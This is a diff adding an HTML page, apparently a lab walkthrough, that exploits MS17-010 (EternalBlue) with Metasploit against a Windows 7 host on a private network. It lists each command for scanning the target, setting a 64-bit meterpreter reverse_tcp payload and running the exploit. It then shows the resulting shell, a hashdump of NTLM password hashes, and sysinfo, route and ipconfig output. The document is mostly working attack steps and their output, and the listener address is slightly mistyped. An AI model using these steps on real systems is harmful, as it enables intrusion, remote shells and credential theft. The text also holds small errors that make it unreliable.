@@ -1,0 +1,105 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Metasploit </title>
+</head><body>Command : msfconsole<br/>
+Command : search eternalblue<br/>
+Command : use auxiliary/scanner/smb/smb_ms17_010 <br/>
+Command : options<br/>
+Command : set rhosts 192.168.142.130<br/>
+Command : run<br/>
+<br/>
+As a result we came to know this :<br/>
+[+] 192.168.142.130:445  - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)<br/>
+<br/>
+But there's a second way to do this and you can also search for Ms17-010 instead of eternal blue and will get the same result.<br/>
+<br/>
+Command : search Ms17-010<br/>
+Command : use exploit/windows/smb/ms17_010_eternalblue<br/>
+Command : options <br/>
+Will use the check feature to verify if it's vulnerable to ms17-010 or not<br/>
+Command : set rhosts 192.168.142.130<br/>
+Command : check <br/>
+[*] 192.168.142.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check<br/>
+[+] 192.168.142.130:445  - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)<br/>
+[*] 192.168.142.130:445  - Scanned 1 of 1 hosts (100% complete)<br/>
+[+] 192.168.142.130:445 - The target is vulnerable.<br/>
+<br/>
+Payloads are bydefault set to 32 bits atleast in this example. But we already know that the system is 64bit so will set it according to it.<br/>
+<br/>
+Command : set payload windows/x64/meterpreter/reverse_tcp<br/>
+Command : options<br/>
+Command : set lhosts 192.18.142.128<br/>
+Command : run<br/>
+It may not work on the first attempt for most of the time so we have to run it for few time to get to the meterpreter shell.<br/>
+But in our case it has run in the first attempt itself.<br/>
+<br/>
+meterpreter : hashdump<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::<br/>
+user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::<br/>
+<br/>
+meterpreter &gt; sysinfo <br/>
+Computer    : WIN-845Q99OO4PP<br/>
+OS       : Windows 7 (6.1 Build 7601, Service Pack 1).<br/>
+Architecture  : x64<br/>
+System Language : en_US<br/>
+Domain     : WORKGROUP<br/>
+Logged On Users : 1<br/>
+<br/>
+meterpreter &gt; route<br/>
+<br/>
+IPv4 network routes<br/>
+===================<br/>
+ <br/>
+  Subnet       Netmask        Gateway        Metric  Interface<br/>
+  ------         -------            - ------          ------   ---------<br/>
+  0.0.0.0         0.0.0.0         192.168.142.2    10   11<br/>
+  127.0.0.0       255.0.0.0       127.0.0.1       306   1<br/>
+  127.0.0.1       255.255.255.255  127.0.0.1       306   1<br/>
+  127.255.255.255  255.255.255.255  127.0.0.1       306   1<br/>
+  192.168.142.0    255.255.255.0    192.168.142.130  266   11<br/>
+  192.168.142.130  255.255.255.255  192.168.142.130  266   11<br/>
+  192.168.142.255  255.255.255.255  192.168.142.130  266   11<br/>
+  224.0.0.0        240.0.0.0       127.0.0.1       306   1<br/>
+  224.0.0.0       240.0.0.0        192.168.142.130  266   11<br/>
+  255.255.255.255  255.255.255.255   127.0.0.1      306   1<br/>
+  255.255.255.255  255.255.255.255   192.168.142.130 266   11<br/>
+<br/>
+No IPv6 routes were found.<br/>
+<br/>
+meterpreter &gt; ipconfig <br/>
+<br/>
+Interface 1<br/>
+============<br/>
+Name     : Software Loopback Interface 1<br/>
+Hardware MAC : 00:00:00:00:00:00<br/>
+MTU     : 4294967295<br/>
+IPv4 Address : 127.0.0.1<br/>
+IPv4 Netmask : 255.0.0.0<br/>
+IPv6 Address : ::1<br/>
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff<br/>
+<br/>
+<br/>
+Interface 11<br/>
+============<br/>
+Name     : Intel(R) PRO/1000 MT Network Connection<br/>
+Hardware MAC : 00:0c:29:c5:26:49<br/>
+MTU     : 1500<br/>
+IPv4 Address : 192.168.142.130<br/>
+IPv4 Netmask : 255.255.255.0<br/>
+IPv6 Address : fe80::6554:1aa3:5de6:6bcb<br/>
+IPv6 Netmask : ffff:ffff:ffff:ffff::<br/>
+<br/>
+<br/>
+Interface 12<br/>
+============<br/>
+Name     : Microsoft ISATAP Adapter<br/>
+Hardware MAC : 00:00:00:00:00:00<br/>
+MTU     : 1280<br/>
+IPv6 Address : fe80::5efe:c0a8:8e82<br/>
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff<br/>
+<br/>
+<img height="373" src="mandee.png" width="700"/><br/>
+</body></html>
